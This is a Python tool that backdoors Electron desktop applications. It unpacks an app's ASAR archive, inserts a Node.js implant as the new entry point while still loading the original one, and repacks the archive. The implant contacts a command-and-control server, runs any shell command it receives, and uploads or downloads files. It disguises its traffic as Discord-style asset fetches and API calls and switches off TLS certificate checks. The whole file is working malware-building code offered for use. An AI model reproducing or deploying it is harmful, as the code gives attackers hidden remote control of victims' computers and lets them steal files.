import subprocess
import os
import shutil
import re
import json

def getMainFunc(asarDir):
    with open(f"{asarDir}/package.json", 'r') as file:
        packageFile = file.readlines()

    main = re.compile(r'\"main\":.*')

    for num, line in enumerate(packageFile, start=0):
        if re.search(main, line):
            oldmain = packageFile[num].lstrip().replace(",", "").rstrip("\n")
            oldmain = f"{{{oldmain}}}"
            break

    json_data = json.loads(oldmain)
    mainValue = json_data["main"]
    return mainValue

def generateImplant(ip, port, asarDir):
    implantCode = f"""
    const index = require('./{getMainFunc(asarDir)}');
    const https = require('https');
    const exec = require('child_process').exec;
    const fs = require('fs');
    const process = require('process')

    const HOST = "{ip}"
    const PORT = {port}
    const C2_SERVER = `https://${{HOST}}:${{PORT}}`;

    //get requests to not look sus
    const getRequests = [
    'bootstrap.js',
    'index.html',
    'styles.css',
    'app.css',
    'discord.js',
    'teams.js',
    'app.js',
    'channels.json',
    'messages.json',
    'user_settings.json',
    'profile_picture.png',
    'emoji.gif',
    'fontawesome.woff',
    'roboto.woff2',
    'voice_message.mp3',
    'video_attachment.mp4',
    'icon.svg',
    'manifest.json'];

    //post requests also to not look sus
    const postRequests = [
    'api/v9/channels/{{channel_id}}/messages',
    'api/v9/channels/{{channel_id}}/messages/attachments',
    'api/v9/users/@me/settings',
    'api/v9/guilds/{{guild_id}}/channels',
    'api/v9/invite/{{invite_code}}',
    'api/v9/oauth2/token',
    'api/v9/users/@me/avatar',
    'api/v9/channels/{{channel_id}}/messages/bulk-delete',
    'api/v9/applications/{{application_id}}/commands',
    'api/v9/users/@me/guilds'];

    //ignore cert security
    process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0;

    function uploadFile(file) {{
        https.get(`${{C2_SERVER}}/upload.php/${{file}}`, (res) => {{
            let data = '';

            res.on('data', chunk => {{
                data += chunk;
            }});

            res.on('end', () => {{
                console.log(`${{C2_SERVER}}/upload.php/${{file}}`);
                console.log(data);
                const base64String = data;
                const filePath = file;

                const cleaned = base64String.split(',')[1] || base64String;

                const buffer = Buffer.from(cleaned, 'base64');

                fs.writeFileSync(filePath, buffer);
            }});
        }});
    }}

    function downloadFile(file) {{
        const content = fs.readFileSync(file);

        const base64data = content.toString('base64');

        const postData = JSON.stringify({{ result: base64data }})
        const options = {{
            hostname: HOST,
            port: PORT,
            path: `/upload.php/${{file}}`,
            method: 'POST',
            headers: {{
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }}
        }};

        const req = https.request(options, res => {{
            console.log(`Status: ${{res.statusCode}}`);
        }});

        req.on('error', err => {{
            console.error(`Error sending output ${{err.message}}`);
        }});

        req.write(postData);
        req.end();
    }}

    function pollServer() {{
        const requestPath = getRequests[Math.floor(Math.random() * getRequests.length)];
        https.get(`${{C2_SERVER}}/${{requestPath}}`, (res) => {{
            let data = '';

            res.on('data', chunk => {{
                data += chunk;
            }});

            res.on('end', () => {{
                //data = data.trim();
                if (data && data !== '204 - No Content') {{
                    console.log('Recieved command: ', data);
                    if (data == "getpid") {{
                        sendOutput(process.pid.toString())
                    }} else if (data == "kill") {{
                        process.kill(process.pid, "SIGINT");
                    }} else if (data.split(' ')[0] == "upload") {{
                        uploadFile(data.split(' ')[1]);
                    }} else if (data.split(' ')[0] == "download") {{
                        downloadFile(data.split(' ')[1]);
                    }} else {{
                        exec(data, (error, stdout, stderr) => {{
                            if (error) {{
                                console.error(`Error executing command: ${{error.message}}`);
                                sendOutput(`Error: ${{error.message}}`);
                            }} else {{
                                console.log(data)
                                sendOutput(stdout || stderr);
                            }}
                        }});
                    }}
                    
                    
                }} else {{
                    console.log('No command recieved.')
                }}
            }});
        }}).on('error', err => {{
            console.error(`Error connecting to C2 server: ${{err.message}}`);
        }});
    }}

    function sendOutput(output) {{
        const postData = JSON.stringify({{ result: output }});
        const requestPath = postRequests[Math.floor(Math.random() * postRequests.length)];
        const options = {{
            hostname: HOST,
            port: PORT,
            path: `/${{requestPath}}`,
            method: 'POST',
            headers: {{
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }}
        }};

        const req = https.request(options, res => {{
            console.log(`Status: ${{res.statusCode}}`);
        }});

        req.on('error', err => {{
            console.error(`Error sending output ${{err.message}}`);
        }});

        req.write(postData);
        req.end();
    }}

    setInterval(pollServer, 5000);
    """

    return implantCode

def generatePackage(asarDir):

    with open(f"{asarDir}/package.json", 'r') as file:
        packageFile = file.readlines()

    main = re.compile(r'\"main\":.*')

    for num, line in enumerate(packageFile, start=0):
        if re.search(main, line):
            oldmain = packageFile[num].lstrip().replace(",", "").rstrip("\n")
            oldmain = f"{{{oldmain}}}"
            packageFile[num] = "\t\"main\": \"main.js\",\n"
            break
    #print(oldmain)
    

    return packageFile


def extractAsar(archive):
    print(f"Extracting ASAR archive: {archive}...")
    subprocess.run(f'npx asar e {archive} extract', shell=True)


def createAsarFile(asarArchive, ipaddress, port):

    extractAsar(asarArchive)

    tempDir = "extract"

    print("Generating implant...")
    if os.path.exists(tempDir):
        implant = generateImplant(ipaddress, port, tempDir)
        package = generatePackage(tempDir)
        
        
        os.makedirs(tempDir, exist_ok=True)

        #Implant code file
        with open(f"{tempDir}/main.js", 'w') as file:
            file.write(implant)
        #Package json file
        with open(f"{tempDir}/package.json", 'w') as file:
            file.writelines(package)

        #use npx to generate app.asar
        print("Generating ASAR archive: app.asar")
        if not os.path.exists("../Output"):
            subprocess.run("mkdir ../Output", shell=True)
        subprocess.run(f'npx asar p {tempDir} ../Output/app.asar', shell=True)

    else:
        print("Error extracting ASAR archive.")

    #delete temp file after making asar archive
    if os.path.exists(tempDir):
        shutil.rmtree(tempDir)


    